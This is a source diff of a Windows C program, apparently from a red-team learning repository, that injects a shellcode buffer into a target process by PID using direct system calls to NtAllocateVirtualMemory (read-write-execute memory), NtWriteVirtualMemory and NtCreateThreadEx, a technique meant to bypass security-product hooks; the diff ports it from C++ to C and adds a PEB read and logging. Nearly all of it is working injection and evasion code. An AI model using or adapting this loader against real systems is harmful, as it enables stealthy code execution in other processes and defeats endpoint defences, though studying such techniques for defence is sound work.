@@ -1,53 +1,62 @@
 /*
 * ml64.exe /c direct-syscalls.asm
-* cl.exe direct-syscalls-ex.cpp ps-utils.cpp syscall-utils.cpp direct-syscalls.obj /Fe:direct-syscalls.exe
+* cl.exe direct-syscalls-ex.c ..\includes\ps-utils.c direct-syscalls.obj /Fe:direct-syscalls.exe
 */
 #include <stdio.h>
-#include "syscall-utils.h"
-#include "ps-utils.h"
+#include <windows.h>
+#include "..\includes\ps-utils.h"
+#include "..\includes\peb-eat-utils.h"
+#include "..\includes\syscall-utils.h"
 
-extern "C" {
-        // https://ntdoc.m417z.com/NtAllocateVirtualMemory
-        NTSTATUS SysNtAllocateVirtualMemory(
-            HANDLE ProcessHandle,    
-            PVOID* BaseAddress,      
-            ULONG_PTR ZeroBits,      
-            PSIZE_T RegionSize,      
-            ULONG AllocationType,    
-            ULONG Protect            
-        );
+// https://ntdoc.m417z.com/NtAllocateVirtualMemory
+NTSTATUS SysNtAllocateVirtualMemory(
+    HANDLE ProcessHandle,    
+    PVOID* BaseAddress,      
+    ULONG_PTR ZeroBits,      
+    PSIZE_T RegionSize,      
+    ULONG AllocationType,    
+    ULONG Protect            
+);
 
-        // https://ntdoc.m417z.com/NtWriteVirtualMemory
-        NTSTATUS SysNtWriteVirtualMemory(
-            HANDLE ProcessHandle,     
-            PVOID BaseAddress,        
-            PVOID Buffer,             
-            SIZE_T NumberOfBytesToWrite, 
-            PSIZE_T NumberOfBytesWritten 
-        );
+// https://ntdoc.m417z.com/ntprotectvirtualmemory
+NTSTATUS SysNtProtectVirtualMemory(
+    HANDLE ProcessHandle,
+    PVOID *BaseAddress,
+    PSIZE_T RegionSize,
+    ULONG NewProtection,
+    PULONG OldProtection
+);
 
-        // https://ntdoc.m417z.com/ntcreatethreadex
-        NTSTATUS SysNtCreateThreadEx(
-            PHANDLE ThreadHandle,        
-            ACCESS_MASK DesiredAccess,   
-            PVOID ObjectAttributes,      
-            HANDLE ProcessHandle,        
-            PVOID lpStartAddress,        
-            PVOID lpParameter,           
-            ULONG Flags,                 
-            SIZE_T StackZeroBits,        
-            SIZE_T SizeOfStackCommit,    
-            SIZE_T SizeOfStackReserve,   
-            PVOID lpBytesBuffer          
-        );
+// https://ntdoc.m417z.com/NtWriteVirtualMemory
+NTSTATUS SysNtWriteVirtualMemory(
+    HANDLE ProcessHandle,     
+    PVOID BaseAddress,        
+    PVOID Buffer,             
+    SIZE_T NumberOfBytesToWrite, 
+    PSIZE_T NumberOfBytesWritten 
+);
 
-        // https://ntdoc.m417z.com/NtWaitForSingleObject
-        NTSTATUS SysNtWaitForSingleObject(
-            HANDLE Handle,          
-            BOOLEAN Alertable,      
-            PLARGE_INTEGER Timeout  
-        );
-    }
+// https://ntdoc.m417z.com/ntcreatethreadex
+NTSTATUS SysNtCreateThreadEx(
+    PHANDLE ThreadHandle,        
+    ACCESS_MASK DesiredAccess,   
+    PVOID ObjectAttributes,      
+    HANDLE ProcessHandle,        
+    PVOID lpStartAddress,        
+    PVOID lpParameter,           
+    ULONG Flags,                 
+    SIZE_T StackZeroBits,        
+    SIZE_T SizeOfStackCommit,    
+    SIZE_T SizeOfStackReserve,   
+    PVOID lpBytesBuffer          
+);
+
+// https://ntdoc.m417z.com/NtWaitForSingleObject
+NTSTATUS SysNtWaitForSingleObject(
+    HANDLE Handle,          
+    BOOLEAN Alertable,      
+    PLARGE_INTEGER Timeout  
+);
 
 int main(int argc, char* argv[]) {
     unsigned char buf[] =
@@ -84,7 +93,7 @@ int main(int argc, char* argv[]) {
     printf("[*] Running PI with target PID: %u\n", pid);
 
     // Open a handle to the current process, this must be passed to VirtualAllocEx
-    HANDLE pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
+    HANDLE pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
     if (pHandle == NULL) {
         printf("Failed to acquire process handle!\n");
         return -1;
@@ -92,21 +101,23 @@ int main(int argc, char* argv[]) {
 
     printf("[*] Successfully opened handle to PID: %u\n", pid);
 
+    PPEB pPeb = (PPEB)__readgsqword(0x60);
+
+    printf("[*] Running allocation with SysNtAllocateVirtualMemory.\n");
     PVOID bufferAddress = NULL;
 	SIZE_T buffSize = sizeof(buf); 
-	//SysNtAllocateVirtualMemory((HANDLE)-1, (PVOID*)&bufferAddress, (ULONG_PTR)0, &buffSize, (ULONG)(MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
     SysNtAllocateVirtualMemory(pHandle, (PVOID*)&bufferAddress, (ULONG_PTR)0, &buffSize, (ULONG)(MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
 
+    printf("[*] Writing buffer with SysNtWriteVirtualMemory.\n");
 	SIZE_T bytesWritten;
-	//SysNtWriteVirtualMemory(GetCurrentProcess(), bufferAddress, buf, sizeof(buf), &bytesWritten);
     SysNtWriteVirtualMemory(pHandle, bufferAddress, buf, sizeof(buf), &bytesWritten);
 
+    printf("[*] Creating thread with SysNtCreateThreadEx.\n");
 	HANDLE hThread;	
-	//SysNtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), (LPTHREAD_START_ROUTINE)bufferAddress, NULL, FALSE, 0, 0, 0, NULL);
-    SysNtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, pHandle, (LPTHREAD_START_ROUTINE)bufferAddress, NULL, FALSE, 0, 0, 0, NULL);
-	
-	SysNtWaitForSingleObject(hThread, FALSE, NULL);
-	getchar();
+	SysNtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, pHandle, (LPTHREAD_START_ROUTINE)bufferAddress, NULL, FALSE, 0, 0, 0, NULL);
 
+    printf("[*] Waiting for thread with SysNtWaitForSingleObject.\n");
+	SysNtWaitForSingleObject(hThread, FALSE, NULL);
+    printf("[+] Process injection complete.\n");
     return 0;
 }
